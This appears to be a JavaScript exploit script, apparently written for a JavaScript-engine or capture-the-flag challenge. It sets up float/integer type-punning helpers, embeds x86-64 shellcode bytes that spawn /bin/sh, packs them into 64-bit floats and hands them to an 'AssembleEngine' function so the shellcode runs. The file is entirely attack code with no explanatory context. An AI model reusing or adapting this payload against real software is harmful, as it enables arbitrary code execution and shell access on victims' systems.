var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);
var u8_buf = new Uint8Array(buf);

function ftoi(val) {
  f64_buf[0] = val;
  return u64_buf[0];
}

function itof(val) {
  u64_buf[0] = val;
  return f64_buf[0];
}

var shellcode = [0x31,0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05];
while(shellcode.length % 8 != 0) {
    shellcode.push(0x90);
}

var payload = [];
for (let i = 0; i < shellcode.length; i++) {
    u8_buf[ (i % 8) ] = shellcode[i];
    if(i % 8 == 7) {
        payload.push(f64_buf[0]);
    }
}
// Get the last one pushed
payload.push(f64_buf[0]);

AssembleEngine(payload);